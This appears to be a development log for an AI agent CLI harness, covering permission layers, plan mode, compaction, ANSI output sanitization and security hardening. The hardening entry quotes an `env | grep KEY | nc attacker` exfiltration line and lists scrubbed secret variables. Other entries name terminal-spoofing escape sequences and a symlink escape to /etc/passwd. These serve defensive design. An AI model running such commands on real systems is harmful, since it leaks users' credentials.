  before policy + DB (no execute, no toolCallId); read-only tool
  still executes normally in plan mode.
- `tests/harness/loop.test.ts` — 1: end-to-end runAgent with
  planMode + permissive policy + write tool_use → denied at
  harness, decision.kind === 'deny', execute never called.
- Total suite: **548 pass / 7 skip / 1215 expect() calls** in ~1.6s.

**Out of scope (deferred):**
- Interactive `<PlanReview>` modal with `[a]ccept/[e]dit/[r]eject` —
  M3 (needs Ink).
- Plan → run reentry with structured goal injection — M3.
- Schema-validated YAML output (`spec §5.1` formal schema) — M5
  (constrained generation backend).
- Plan-as-artifact persistence (`.agent/plans/<timestamp>.md`) —
  deferred; current model output goes to stdout, captured if user
  redirects.
- `acceptEdits` profile (third profile in §5.1) — separate step.
  acceptEdits is policy-mode (`PolicyMode.acceptEdits`) and already
  exists in the engine; CLI flag would just inject a session policy.

**Pending:** none for this step.

**Next:** M2 / Step 6 — Eval smoke. Final canonical M2 item per
spec §18. Minimal eval harness: 5-10 fixed tasks, executor that
runs `runAgent` against a real model, measures pass-rate + p50
cost. Critério de saída: pass-rate ≥85% smoke, p50 < $0.20/task.
Without it the rest of M2 is asserted-to-work without proof.

---

## [2026-04-28] M2 / Step 4 — Permission hierarchy

`AGENTIC_CLI §8` requires layered policy resolution: enterprise →
user → project → session. M1 only loaded `./.agent/permissions.yaml`,
leaving the higher and lower precedence tiers stubbed. Step 4 closes
that gap; trust prompt (the other half of M2 step 4 in the spec) is
deferred to `docs/TODO.md` because it depends on interactive UI that
hasn't landed yet.

**Done:**
- `src/permissions/paths.ts` — path discovery for each layer.
  `ENTERPRISE_POLICY_PATH = /etc/agent/permissions.yaml`. User path
  honors `XDG_CONFIG_HOME` (with empty-string fallback to
  `~/.config/agent/permissions.yaml`). Project path stays
  `cwd/.agent/permissions.yaml`.
- `src/permissions/hierarchy.ts` — `resolvePolicy({cwd, ...})` walks
  the four layers, loads each that exists, merges with locked-section
  semantics. Returns the effective `Policy`, the loaded
  `LayerPolicy[]` trail, and a `LockConflict[]` array describing any
  override attempts that were rejected.
- `src/permissions/types.ts` — added `locked?: boolean` to
  `PolicyDefaults`, `BashPolicy`, `PathPolicy`, `FetchPolicy`. Validator
  accepts and rejects non-boolean values.
- `src/permissions/config.ts` — `parsePolicy` round-trips `locked` on
  defaults and on each tool section.
- `src/cli/bootstrap.ts` — replaces the single-file `loadPolicyFromFile`
  call with `resolvePolicy`. New `BootstrapResult` shape: `policyLayers`
  (array of which layers contributed) + `lockConflicts` (warnings to
  surface). Test seams `enterprisePolicyPath`/`userPolicyPath` accept
  `null` to disable a layer entirely (avoid touching `/etc` in tests).
- `docs/TODO.md` — trust prompt deferral with rationale and pull-in
  signal.

**Merge semantics:**
- **Replace, not extend.** A lower-precedence layer that defines
  `tools.bash` fully replaces the higher layer's `tools.bash`.
  Predictable + matches most config systems; users who want to extend
  re-list everything. Spec stayed silent on this; replace is the safer
  choice for security policy (no surprise merges that allow more than
  the user intended).
- **Locked sections drop overrides + record conflicts.** Once any
  layer marks a section as `locked: true`, subsequent layers'
  attempts to redefine that section are silently dropped from the
  merged result and recorded in `lockConflicts` with
  `{section, lockedBy, attemptedBy}`. Caller (CLI run.ts) prints
  conflicts as warnings to stderr.
- **Same-value isn't a conflict.** A lower layer setting
  `defaults.mode: strict` when enterprise locked mode at `strict` is
  silently OK — only differing values trip the conflict log.

**New tests (+15 over Step 3):**
- `tests/permissions/paths.test.ts` — 5 cases: enterprise constant,
  XDG honored, XDG-empty falls back, ~/.config fallback, project path.
- `tests/permissions/hierarchy.test.ts` — 10 cases: discovery (no
  files, project only, three-layer precedence, session override),
  locked semantics (enterprise blocks user, enterprise blocks project,
  user blocks project, multi-layer conflict log, non-locked replace,
  same-value non-conflict).
- `tests/cli/bootstrap.test.ts` — updated to use `policyLayers`
  instead of removed `policySource` field; `enterprisePolicyPath: null`
  + `userPolicyPath: null` test seams pin that the test suite never
  touches `/etc/agent` or `~/.config/agent` during run.
- Total suite: **512 pass / 7 skip / 1132 expect() calls** in ~1.5s.

**Decisions:**
- **`enterprisePath: null` and `userPath: null` as test seams** rather
  than relying on `existsSync` returning false. Tests that don't
  actively use a layer set the path to `null` so the layer is
  guaranteed not to be probed. Catches the class of test bugs where
  a CI runner happens to have `/etc/agent/permissions.yaml` and the
  test silently picks it up.
- **`Policy` type ships `locked` as part of the schema**, not as a
  separate per-layer flag map. Round-trips through YAML; admins can
  inspect any layer's `locked` directly in the file without consulting
  a separate manifest.
- **All four layers use the same lock semantics**, not "only
  enterprise can lock". Spec language is "enterprise pode marcar
  regras como locked" (can mark) — doesn't preclude others. Uniform
  semantics are simpler and let user/project lock things from session
  too (think: a project locks its `tools.write_file.deny_paths`
  against runtime `--allow-write-everywhere` flags later).
- **`session` layer threads through `ResolveOptions.session`** rather
  than reading a separate config file. Session-layer config in M1 is
  only injected via tests / harness wiring; CLI flags adding to it is
  Step 5+ work.
- **`policyLayers` returns `('enterprise'|'user'|'project'|'session')[]`**
  instead of the old single `policySource: 'project'|'default'` enum.
  Multi-layer is now the norm; an empty array signals "no layer file
  found anywhere — engine falls back to default strict policy".

**Out of scope:**
- Trust prompt (deferred — see `docs/TODO.md`).
- `agent perms` introspection subcommand (would render `layers` and
  `lockConflicts` for the user). Cosmetic, lands when slash commands
  arrive in M3.
- CLI flag → session policy threading (`--allow`, `--deny`, etc).
  Session layer accepts injected policy today; binding flags to it
  is a later step.
- Windows path discovery (`%PROGRAMDATA%`, `%APPDATA%`). Linux/Mac
  only in M1/M2; same posture as `src/storage/paths.ts`.
- Multi-file policy in a layer (e.g., `~/.config/agent/permissions.d/*.yaml`).
  Single file per layer for now; conf.d-style fragments deferred.

**Pending:** none for this step.

**Next:** M2 / Step 5 — Plan mode (`--plan`). Read-only profile that
short-circuits all `writes: true` tools, asks the model to produce a
plan in markdown, exits without applying. Reuses the permissions
engine: a session-layer policy with `bypass`-style read tools and
deny-all writes. Useful for dirigirthe CLI in big repos with
confidence.

---

## [2026-04-28] M2 / Step 3 — Compaction

`AGENTIC_CLI.md §6` and `ORCHESTRATION.md §4` require the harness to
shrink conversation history when the prompt approaches the model's
context window. M1 sent the full history every turn; long sessions
would either burn cache hits or hit the cap. Step 1's telemetry
provides the trigger signal (per-turn prompt token count); Step 3
spends it.

**Done:**
- `src/harness/compaction.ts` — `compactMessages(provider, messages, options)`
  rewrites a `ProviderMessage[]` keeping the first user message
  (goal) and the last K turns literal, summarizing everything in
  between via an LLM call. Falls back to deterministic elision (drop
  `tool_result` bodies, replace with `[tool_result elided: N bytes]`
  pointers) when the LLM call fails. `temperature: 0` on the summary
  call so the same input compacts the same way across reruns.
- `src/harness/types.ts` — `RunBudget.compactionThreshold` (default
  `0.7`) and `compactionPreserveTail` (default `3`) per spec
  §4.1/§4.6. New `HarnessEvent` kinds `compaction_started` and
  `compaction_finished` carry threshold, prompt tokens, strategy
  (`'llm' | 'fallback' | 'skipped'`), folded count, duration, and
  reason. JSON renderer carries them through NDJSON automatically.
- `src/harness/loop.ts` — trigger check at the bottom of each loop
  iteration (after tool_results push, before the next request). Uses
  the LAST turn's `usage.input + cache_read + cache_creation` as a
  proxy for "size of the next request" — free signal, no extra
  countTokens HTTP call. Skips when telemetry was unavailable for
  the turn (`usageSeen=false`) since a guess could be very wrong.
  In-place rewrites the running `messages` array; the SQLite
  `messages` table stays intact so audit / replay can re-derive a
  different compaction policy later.
- Synthetic summary message uses `assistant` role with explicit
  `[compacted_history] ... [/compacted_history]` markers. Wrapper
  re-adds markers if the model forgets them so downstream scanners
  (recap, audit) can locate compacted blocks unambiguously.
- Fallback path emits a synthetic note describing strategy + reason,
  followed by the original middle messages with `tool_result` bodies
  elided. Pointer string includes original byte size and points to
  the audit log so a forensics user can recover the body.

**New tests (+11 over Step 2):**
- `tests/harness/compaction.test.ts` — 8 cases:
  - LLM happy path: goal + tail preserved, middle replaced with one
    summary message.
  - Marker re-injection when the model returns prose without them.
  - Summary request shape: `temperature: 0`, configurable `maxTokens`,
    compaction system prompt instead of the run's.
  - History too short → `strategy: 'skipped'`, no provider call.
  - LLM throw → `strategy: 'fallback'`, original middle preserved
    with `tool_result` content elided.
  - Stream-only errors → fallback (no useful summary).
  - Empty summary text → fallback.
  - Aborted signal → fallback (the abort reaches the LLM call via
    `abortableIterable`).
- `tests/harness/loop.test.ts` — 3 cases:
  - Trigger fires when `prompt_tokens > threshold × context_window`;
    `compaction_started` and `compaction_finished` events emit;
    post-compaction request reaches the provider with shorter
    `messages.length`.
  - Below threshold → no event.
  - `usageSeen=false` → no event (can't guess size honestly).
- Total suite: **459 pass / 7 skip / 1016 expect() calls** in ~1.5s.

**Decisions:**
- **Trigger signal is the LAST turn's billed prompt tokens**, not a
  pre-flight `countTokens` call. `countTokens` would be a free-cost
  HTTP roundtrip on Anthropic and a heuristic on OpenAI; reusing
  telemetry already collected is exact (for the request that just
  ran) and zero-cost. The next request is "this history + freshly
  appended tool_results" — strictly larger than what we measured —
  so a turn ≥70% guarantees the next ≥70%. Slightly eager but
  always correct in the safe direction (trigger before we hit the
  cap, never after).
- **Skip when `usageSeen=false`.** Compat endpoints that drop usage
  telemetry leave us blind to the actual prompt size. Guessing
  (chars/4 heuristic over the messages) could be wildly off and
  trigger needless compactions. The conservative call is to skip;
  the user's `~$X.XX (incomplete)` cost indicator already signals
  the missing telemetry.
- **In-memory only — no DB rewrite.** `messages` table keeps every
  original turn. Compaction only mutates the running provider array.
  Replay can re-decide whether to compact or take the long path.
  Avoids an "atomic mid-session DB rewrite" mechanism that would
  multiply the test surface for marginal gain in M2.
- **Same provider as the run for the summary call.** Spec §4.5
  recommends a cheaper model per profile (Haiku for autonomous
  Anthropic). Selecting the cheap model requires a registry-aware
  policy that we'll add when we have profile abstractions in M3+.
  For now, using the run's provider keeps the integration tight
  and lets users override via the registry.
- **Summary inserted as `assistant` role, not `user`.** Two
  consecutive `user` messages would also be valid (Anthropic accepts),
  but presenting the summary as the agent's own context note keeps
  the next turn's user/assistant alternation obvious to the model
  reading the prompt.
- **Fallback preserves the middle messages with elided
  `tool_result` content** rather than collapsing to a single note.
  Tool_use blocks reference IDs the next turn might still cite;
  preserving the structure (with bodies replaced by pointers) keeps
  those references resolvable. Pointer carries original byte size
  so a verbose-mode user knows the magnitude of what was dropped.
- **Marker re-injection on missing markers.** Tests pin that the
  wrapper re-adds `[compacted_history]...[/compacted_history]` when
  the model forgets — drift in the model's structured-output
  adherence shouldn't break downstream scanners.

**Out of scope (deferred):**
- `PreCompact` hook — requires hooks subsystem (M4).
- Pinned context (`CONTEXT_TUNING.md §12.4`) — needs the slash
  command surface and the user-facing pin/unpin UX.
- Goal re-injection literal (`§4.2 step "Goal re-injection literal +
  pinned context"`) — currently the goal IS preserved as message[0]
  but isn't re-injected into the system prompt. Lands when system
  prompt architecture (`CONTEXT_TUNING.md §1`) is implemented.
- Schema-validated compaction output with retry — depends on
  constrained generation backend (M5) for reliable structured
  decoding. Current loose-text approach is acceptable while we
  monitor adherence in eval.
- Per-profile cheap-model selection (`§4.5`) — requires profile +
  model-registry policy plumbing (M3+).
- DB persistence of compaction events / `compaction_runs` table —
  current `onEvent` callback is enough for M2 observability;
  formal audit table lands with the rest of the audit subsystem.
- Atomic SQLite transaction around compaction — only relevant when
  we DO persist the rewrite (deferred above).
- `evals/compaction/static_fallback/` corpus — bound to the evals
  smoke step.
- Truncation tier (oldest assistant turns head+tail) when fallback
  is still > threshold (`§4.6` step 6) — current fallback drops
  bodies; size-bounded follow-up is M2 later step.

**Pending:** none for this step.

**Next:** M2 / Step 4 — Trust prompt + permission hierarchy. New
directory / unknown `AGENTS.md` requires confirmation; merge
enterprise → user → project → session policy resolution. Fixes a
gap from M1 where `./.agent/permissions.yaml` was the only source.

---

## [2026-04-28] M2 / Step 2 — Output sanitization (ANSI strip)

`SECURITY_GUIDELINE.md §3.2` (line 161) and §5 invariant 4 require a
sanitization layer between tool execution and the model context. M1
left the gap explicit; Step 2 closes it.

**Threat covered:**
- A tool returning `\x1b[2K\x1b[1AOK: file empty` lets a malicious
  file lie about what happened when its output is later echoed in a
  terminal (verbose mode, audit replay, recap renderer).
- Tools embedding OSC sequences (`\x1b]0;title\x07`) can hijack the
  terminal title or, with OSC 8, inject deceptive hyperlinks.
- Token waste: ANSI bytes in the model's context inflate input cost
  with bytes the model can't render.
- Prompt-injection vector: text hidden inside escape blocks.

**Done:**
- `src/sanitize/ansi.ts` — `stripAnsi(s)` removes CSI (`\x1b[...`),
  OSC with both BEL and ST terminators, DCS/APC/PM/SOS, 7-bit
  single-char escapes (range 0x40-0x7E covering Type Fe + Fs + RIS),
  and 8-bit C1 controls (0x80-0x9F). Alternation order matches
  structured patterns first, so a malformed `\x1b[123;` falls
  through to the single-char rule (eats just `\x1b[`, leaves `123;`
  as text — leaving live ESC bytes is the security risk).
- `src/sanitize/ansi.ts` — `sanitizeToolOutput(value)` recursively
  walks objects and arrays, stripping ANSI from every string leaf
  while preserving shape, primitives, and discriminator booleans
  (`is_error: true` on `ToolError` survives intact). Cycle detection
  via `WeakSet` replaces revisited references with `<cycle>`; tool
  outputs shouldn't contain cycles, but a buggy input must not
  stack-overflow.
- `src/harness/invoke-tool.ts` — sanitizes the tool result once,
  before both sinks: the audit row (`finishToolCall(... output ...)`)
  and the model-facing `tool_result` block. ToolError messages also
  pass through (a subprocess crashing with colored stderr won't
  smuggle escape bytes into either path).

**New tests (+18 over Step 1):**
- `tests/sanitize/ansi.test.ts` — 12 cases: SGR colors, cursor/erase
  (the canonical "rewrite history" pattern), OSC with both
  terminator styles, DCS/APC, single-char escapes, C1 bytes,
  preservation of plain text and whitespace, malformed CSI handling,
  consecutive sequences. Plus 9 `sanitizeToolOutput` cases: nested
  walk, non-string preservation, cyclic objects, cyclic arrays,
  ToolError discriminator, no-mutation guarantee.
- `tests/harness/invoke-tool.test.ts` — 2 new: ANSI stripped from
  both `tool_result.content` and persisted `tool_calls.output`;
  ANSI in `ToolError.error_message` also stripped. Hard guarantee:
  `JSON.stringify(tc?.output)` contains no `\x1b` byte.
- Total suite: **444 pass / 7 skip / 959 expect() calls** in ~1.4s.

**Decisions:**
- **Sanitize at the harness, not the tool layer.** Universal policy
  beats per-tool opt-in: no future tool can forget to strip. The
  sanitizer runs once and feeds both the audit row and the
  `tool_result` block, so neither path can drift.
- **Strip everything, don't preserve SGR.** The spec language
  ("preservar SGR seguro") targets terminal renderers. For tool
  output flowing to the MODEL there's no terminal — colors are
  noise. A future verbose/interactive renderer that wants to display
  tool output to the user can re-decide at its own layer with its
  own safe-SGR allowlist (renderer side, against text we already
  scrubbed at intake).
- **Recursive walker, not flat string strip.** Tools return
  structured objects (`{stdout, stderr, exit_code}`). Walking
  preserves shape so the model gets `{stdout: "error: real", ...}`
  instead of a re-stringified blob.
- **Cycle marker is `<cycle>`** rather than throwing or silently
  dropping the branch. Tool contract is JSON-shaped (no cycles in
  practice), but a buggy input mustn't stack-overflow; the marker
  keeps the path navigable.
- **Malformed CSI strips just `\x1b[`** instead of leaving the ESC
  byte. The conservative direction is "remove control bytes
  aggressively, leave printable text alone" — orphan params (`123;`)
  in output are harmless noise; live ESC bytes are the security risk.
- **No `--include-tool-output` raw escape hatch yet.** Spec §1.4
  mentions one for future verbose mode. Deferred until M2 has a
  verbose-output path that needs it; the audit row will hold raw
  bytes only when explicitly opted in (and re-stripped before
  re-display).
- **`stripAnsi` keeps `\t \n \r`.** Whitespace bytes are part of
  legitimate text content; only escape sequences are control bytes
  for sanitization purposes.

**Out of scope:**
- Renderer-side SGR allowlist for verbose mode (M2 later step or M3)
- Secret redaction (`SECURITY_GUIDELINE.md §6` — separate layer)
- Injection heuristic with `injection_suspect: true` flag
  (`SECURITY_GUIDELINE.md §9.1.5` — bound to `fetch_url` policy work)
- Real-shell ANSI fixture corpus from `evals/` (deferred to evals
  smoke step)

**Pending:** none for this step.

**Next:** M2 / Step 3 — Compaction. Sliding-window history +
Haiku-driven summarization when context approaches the model's cap.
The Step 1 telemetry tells the harness when to trigger; this step
spends those numbers.

---

## [2026-04-28] M2 / Step 1 — Telemetry: usage tokens + cost tracking

Opens M2 ("Robustez"). Pre-requisite for compaction (need to know when to
trigger) and eval smoke (need cost numbers). Without it, the CLI is flying
blind on production runs.

**Done:**
- `src/providers/types.ts` — new `UsageInfo` (`input` / `output` / `cache_read` / `cache_creation`) and a canonical `kind: 'usage'` `StreamEvent` between the last content event and `stop` in every well-formed turn.
- `src/providers/anthropic/stream.ts` — extracts usage from `message_start.message.usage` (input + cache_read + cache_creation) and from the final `message_delta.usage` (output). Both shapes optional in `RawAnthropicEvent` so older SDK responses still parse. Defaults to zero when the SDK omits it.
- `src/providers/openai/stream.ts` — reads `chunk.usage` from the final chunk (only present when `stream_options.include_usage` is set). Splits `prompt_tokens` minus `prompt_tokens_details.cached_tokens` so `input` semantics match Anthropic (non-cached tokens at full rate, cache_read at the discount tier).
- `src/providers/openai/index.ts` — opts into `stream_options: { include_usage: true }` on every `chat.completions.create`. Falls back to a zeroed UsageInfo when compatibility endpoints (Azure, OpenRouter) ignore the flag.
- `src/providers/google/stream.ts` — reads `chunk.usageMetadata` (cumulative; last chunk wins). Same `prompt − cached` split. `cache_creation` stays zero (Gemini's cache is pre-warmed via a separate API; the stream never reports writes).
- `src/providers/cost.ts` — `computeCost(caps, usage)` honors the four-tier rate table (`input`, `output`, `cache_read`, `cache_creation`); falls back to the raw input rate when `cost_per_1k_cached_input` or `cost_per_1k_cache_write` aren't declared. `addUsage` + `emptyUsage` for accumulation.
- `src/storage/migrations/003-usage-cost.ts` — `ALTER TABLE messages ADD COLUMN cache_creation_tokens INTEGER` + `ADD COLUMN cost_usd REAL`. The original schema had `cached_tokens` (reads) but no separate write column; cost_usd avoids re-deriving pricing every time `agent audit costs` runs.
- `src/storage/repos/messages.ts` — `Message` carries `cacheCreationTokens` / `costUsd`; `appendMessage` accepts and persists them.
- `src/harness/collect.ts` — `CollectedStep.usage` accumulated from `kind: 'usage'` events. Last event wins (defensive for adapters that ever split the report).
- `src/harness/loop.ts` — every assistant turn writes `tokens_in` / `tokens_out` / `cached_tokens` / `cache_creation_tokens` / `cost_usd` to `messages`. Session-wide totals (`totalUsage`, `totalCostUsd`) accumulate across turns, persist via `completeSession(..., totalCostUsd)` (the column already existed but was always written as `0`), and surface in `HarnessResult.usage` + `HarnessResult.costUsd`.
- `src/harness/types.ts` — `HarnessResult` exposes `usage: UsageInfo` and `costUsd: number`. `session_finished` HarnessEvent reuses `result`, so renderers see the totals without a new event shape.
- `src/cli/output/plain.ts` — final summary line now reads `[done/done] N steps · Mms · tokens IN/OUT[ (cache_r X, cache_w Y)] · $0.XXXX`. Cache columns elided when zero so OpenAI/Gemini users don't get noise.
- `src/cli/output/json.ts` — unchanged; passes `session_finished` through and `result.usage` / `result.costUsd` ride along automatically. New test pins the NDJSON shape.

**New tests (+62 over M1):**
- `tests/providers/cost.test.ts` — 9 cases: empty usage, input/output composition, cached_input rate honored, fallback to input rate when cached_input undeclared, cache_write rate honored, fallback for cache_creation, all-four composition, addUsage commutativity.
- `tests/providers/anthropic-stream.test.ts` — 2 new: usage extracted from message_start + message_delta with cache splits; zeroed usage event when SDK omits the payload.
- `tests/providers/openai-stream.test.ts` — 1 new: cached_tokens split out of prompt_tokens (matches Anthropic semantics).
- `tests/providers/google-stream.test.ts` — 1 new: cachedContentTokenCount split out of promptTokenCount.
- `tests/harness/loop.test.ts` — 3 new: aggregates usage across turns + persists to `sessions.total_cost_usd`; per-message tokens + cost on assistant rows; `session_finished` event carries the same usage/cost as the result.
- `tests/cli/output-plain.test.ts` — 1 new: summary shows cache columns when non-zero; existing summary tests updated to assert `tokens N/M` + `$0.XXXX`.
- `tests/cli/output-json.test.ts` — assert NDJSON `session_finished` line contains `result.usage.input` and `result.costUsd`.
- All 3 stream test files gained a `collectNonUsage` helper so the existing exact-sequence assertions (~30 tests) didn't need a `usage` event boilerplate — only the dedicated usage tests use raw `collect`.
- Total suite: **396 pass / 7 skip / 867 expect() calls** in ~1.4s.

**Decisions:**
- **`usage` is its own canonical `StreamEvent` kind**, not a field tacked onto `stop`. Adapters emit it once per turn between the last content event and `stop`; `collectStep` accumulates it independently. Tying usage to `stop` would force every test that asserts a `stop` shape to know about usage; making it its own event lets renderers / collectors choose to ignore it.
- **`prompt_tokens − cached_tokens` split for OpenAI/Gemini** at the adapter, not the cost computer. OpenAI's `prompt_tokens` is the *full* prompt count including cache hits; Anthropic's `input_tokens` is *non-cached only*. Normalizing to Anthropic's semantics here means `computeCost` doesn't need a per-provider branch — it just multiplies by the declared rate.
- **`cost_per_1k_cached_input` / `cost_per_1k_cache_write` fall through to `cost_per_1k_input`** when undeclared. Charging the raw input rate is loud failure — overcounts vs. the discount tier rather than undercounting silently to zero. A model entry that forgets to declare cache rates will show inflated cost and surface the gap in `agent audit costs`.
- **OpenAI provider opts into `stream_options.include_usage` unconditionally.** Without the flag, the final chunk has no `usage` field. A handful of compatibility endpoints (early Azure, some OpenRouter setups) ignore it; the normalizer falls back to a zeroed UsageInfo so the harness still sees a usage event and `costUsd` reads as 0 instead of crashing.
- **Storage migration is additive (`ALTER TABLE` for two columns).** Reusing existing `messages.tokens_in/tokens_out/cached_tokens` rather than introducing a parallel `usage_events` table — keeps queries ergonomic (`SELECT cost_usd FROM messages WHERE session_id = ?`). Per-message `cost_usd` redundant with `tokens × pricing` but stored anyway because `audit costs --by tool` (spec §1) shouldn't have to re-derive pricing every query.
- **Mock provider in tests gains `capsOverride`** for cost-bearing tests (`cost_per_1k_input: 0` was the default; that hides cost bugs). Existing tests stay zero-cost.
- **`collectNonUsage` helper** in stream tests instead of updating ~30 inline arrays. The tests are pinning canonical event order; usage arriving as a new event would force boilerplate without testing anything different. Dedicated usage tests use raw `collect`.

**Out of scope (still M2+):**
- `agent audit costs --by tool / --by session` CLI subcommands (spec §1) — needs M2 Step on session listing/inspection
- Compaction (next Step — uses these usage numbers to decide trigger threshold)
- Cache breakpoint hints to the provider (CONTEXT_TUNING)
- Real-network test fixtures for usage extraction (deferred to evals)
- `agent stats --tokens` discrepancy detector (TOKEN_TUNING §8.3) — needs local tokenizer (M5)
- Honest pricing values in capabilities — they're still illustrative per `PROVIDERS.md §5`; dynamic pricing config deferred

**Code-review fixes folded in before commit:**
- **Anthropic cache_write rates declared explicitly.** All three Anthropic models (`opus-4-7`, `sonnet-4-6`, `haiku-4-5`) now carry `cost_per_1k_cache_write` at 1.25× their input rate per Anthropic's public pricing. Before this fix, `computeCost` fell back to the raw input rate for cache-creation tokens, undercounting Anthropic cache-write turns by 25%. The first review pass mislabeled the fallback as "overcount" — it was the opposite direction.
- **`computeCost` docstring rewrites the cache-fallback decision honestly.** Says "undercounts on Anthropic, declare the rate explicitly" instead of the original "overcounts slightly" claim.
- **OpenAI `stream_options.include_usage` is opt-out via `CreateOpenAIProviderOptions.includeUsage`.** Some compat endpoints (older Azure deployments, certain proxies) reject unknown params with HTTP 400; the option lets users disable telemetry rather than fail the run. Default stays `true`. Two new tests pin both branches: that the param is forwarded by default, and that `includeUsage: false` omits it.
- **`mergeUsage` (Anthropic adapter) uses `Math.max` instead of overwrite.** Today's SDK reports cumulative; if a future shift to incremental deltas (or interim partial counts) ever happens, the largest-seen value wins instead of a smaller late event silently shrinking totals. Regression test pins it.
- **OpenAI normalizer extracts usage AFTER emitting `start`.** Reading `chunk.usage` first was harmless today (the usage-only chunk has empty choices and falls through), but the canonical contract is "start-first"; reordering keeps the invariant.
- **Harness writes NULL token/cost columns when no `usage` event was seen.** New `usageSeen` flag on `CollectedStep` flips `true` only when an actual `kind: 'usage'` event arrived. Lets downstream analytics (`agent audit costs`) tell "adapter never reported" from "turn measured zero". Three new collect.test.ts cases cover the flag transitions; loop test asserts NULL persistence.
- **`formatCost` is magnitude-aware.** Sub-$1 keeps 4 decimals (real billing precision matters there); $1–$100 uses 3; $100+ uses 2. Long sessions no longer print `$50.0000`-style cosmetic noise. Test sweeps three ranges.
- **`collectNonUsage` consolidated** into `tests/providers/_stream-helpers.ts` instead of duplicated across 3 files. Imported by all stream tests.
- **Migration 003 carries a note** that `cost_usd` is intentionally a write-time snapshot, not a recomputable derivation — historical rows preserve the rate the user was actually billed at, even if pricing config drifts later.

**Pending:** none for this step.

**Next:** M2 / Step 2 — Output sanitization (CSI escape stripping in `bash` / `read_file` / `grep` outputs before content reaches the model). Small, isolated, closes a security gap from M1. After that, compaction.

---

## [2026-04-27] M1 / Step 7 — Hardening pass

Addresses the 10-issue review of M1: real reliability/security gaps caught
before shipping. Each fix has a regression test where unit-testable.

**Done:**
- `src/storage/json-safe.ts` — `parseJsonSafe(raw, context)` + `StorageJsonError`. `messages.fromRow` and `tool_calls.fromRow` route through it so a tampered DB surfaces a typed error instead of a bare `SyntaxError` from `JSON.parse`.
- `src/permissions/matcher.ts` — `matchPath` now realpath-resolves the target before matching. A symlink at `src/link → /etc/passwd` no longer matches the `src/**` pattern (the matcher sees `/etc/passwd` and falls out via the cwd-anchored fallback). Two regression tests cover symlink-on-file and symlink-on-directory; one pins that non-existent paths (write_file new file) still match via parent realpath.
- `src/harness/invoke-tool.ts` — the tool_call setup (`createToolCall` + `recordApproval` + `startToolCall`/`finishToolCall`) is now wrapped in `withTransaction`. A crash between those statements no longer leaves orphan rows or stuck-pending status with a "should be denied" approval.
- `src/harness/loop.ts` — entire loop body wrapped in `try { ... } catch (e) { return guardedFinish(e) }`. SQLite errors from `appendMessage`/etc. now produce a clean `error/providerError` exit instead of crashing the caller.
- `src/harness/loop.ts` — wall-clock cap is now enforced *during* a step. `AbortSignal.any([callerSignal, wallClockController.signal])` composes the user's signal with a `setTimeout(..., maxWallClockMs)` controller. A hung provider/tool gets the abort signal mid-execution; provider and tools already honor the signal.
- `src/harness/loop.ts` — the partial tool_results message persisted on `maxToolErrors` bail is now also pushed to the in-memory `messages` array, keeping the two views in sync. Footgun for any future code that reads `messages` post-bail (resume/replay).
- `src/harness/retry.ts` — new `generateWithRetry(provider, req, opts)` wraps `provider.generate()` per CONTRACTS.md §4. Retries on 429 / 5xx / network errors with exponential backoff (200/800/3200 ms by default, 3 attempts). Refuses to retry once any event has yielded — replaying mid-stream would emit duplicates. `isRetryableError` duck-types `e.status` and `e.code` instead of importing every SDK's error class. The harness's `collectStep` call goes through this.
- `src/tools/builtin/bash.ts` — env scrub before spawn. Strips `*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `*_PASS`, `AWS_*`, `OPENAI_*`, `ANTHROPIC_*`, `GOOGLE_API_KEY`, `GEMINI_API_KEY`, `GITHUB_TOKEN`/`GH_TOKEN`, `NPM_TOKEN`, `DOCKER_PASSWORD`. Closes the obvious `bash("env | grep KEY | nc attacker")` exfil path; not a substitute for the M2 sandbox.
- `src/cli/output/{plain,json}.ts` — renderers now accept injectable `out`/`err` sinks so they can be unit-tested without spawning subprocesses or hijacking `process.stdout/stderr`. Plain renderer also gains `maxArgsChars` (default 200) so `tool_invoking` doesn't dump 10KB of `write_file` content into the terminal. Added `provider_event` → `error` → stderr path that the original renderer silently dropped.
- `src/cli/run.ts` — `RunOptions.rendererOverride` and `RunOptions.errSink` test seams so end-to-end runs can be exercised without polluting process streams.

**New tests:**
- `tests/storage/json-safe.test.ts` — 1 test asserting tampered `messages.content` surfaces as `StorageJsonError` with the right context string.
- `tests/permissions/symlink.test.ts` — 4 tests: symlink-on-file escape rejected, symlink-on-directory escape rejected, plain path still matches, write-new-file still matches via parent realpath.
- `tests/harness/retry.test.ts` — 13 tests: `isRetryableError` matrix (429/5xx/4xx/network codes/non-Error), happy passthrough, retry-and-succeed, no-retry-after-yield, no-retry on non-retryable, exhaustion throws last error, custom sleep schedule pins backoff.
- `tests/cli/output-plain.test.ts` — 14 tests: every event type's stdout/stderr split, args truncation, color on/off ANSI presence, deny/confirm formatting, allow silent, flush trailing newline.
- `tests/cli/output-json.test.ts` — 3 tests: NDJSON shape, provider_event roundtrip, flush no-op.
- `tests/cli/run.test.ts` — 8 tests: `exitCodeFor` matrix, end-to-end with mock provider for happy/exhausted/aborted/bootstrap-failure, renderer.flush invocation.
- `tests/tools/bash.test.ts` — added 1 test asserting `ANTHROPIC_API_KEY`, `MY_TOKEN`, `AWS_SECRET_ACCESS_KEY` are scrubbed from subprocess env while non-sensitive vars pass through.
- Total suite: **334 pass / 6 skip / 714 expect() calls** in ~1.6s. +49 tests over Step 6.

**Code-review fixes folded in before commit:**
- **Abort during provider stream now returns `interrupted/aborted` (or `interrupted/maxWallClockMs`) instead of `error/providerError`.** When the SDK throws on signal abort mid-call, the harness's `collectStep` catch now checks `signal.aborted` first and routes to the matching ExitReason. User Ctrl+C while a provider hangs gets a clean exit code 130 instead of the misleading exit code 1 with "harness: aborted" detail. Regression test pins it.
- **New `'internalError'` exit reason** for uncaught throws in the harness path (typically SQLite errors). Was reusing `'providerError'`, which mislabeled DB errors as provider failures in the audit trail. Both still map to `error` status / exit 1; the difference is just diagnostic clarity.

**Decisions:**
- **Retry only before yield.** Retrying mid-stream would replay the partial output and produce duplicates. The common failure mode (429/connect refused) happens before any event is emitted; that's the case we cover.
- **Retry detection is duck-typed** (`e.status`, `e.code`) not type-checked against SDK error classes. Each provider SDK has its own error hierarchy; importing all of them would couple `retry.ts` to every adapter.
- **Realpath fallback chain** for non-existent targets: try the path itself, then `realpath(parent) + basename`. Keeps `write_file` working on new files while still catching symlinked parent dirs (the realistic escape).
- **Wall-clock combined via `AbortSignal.any`** rather than a separate periodic check. Composing signals propagates to provider/tool naturally — they already honor the signal — so no second abort plumbing is needed.
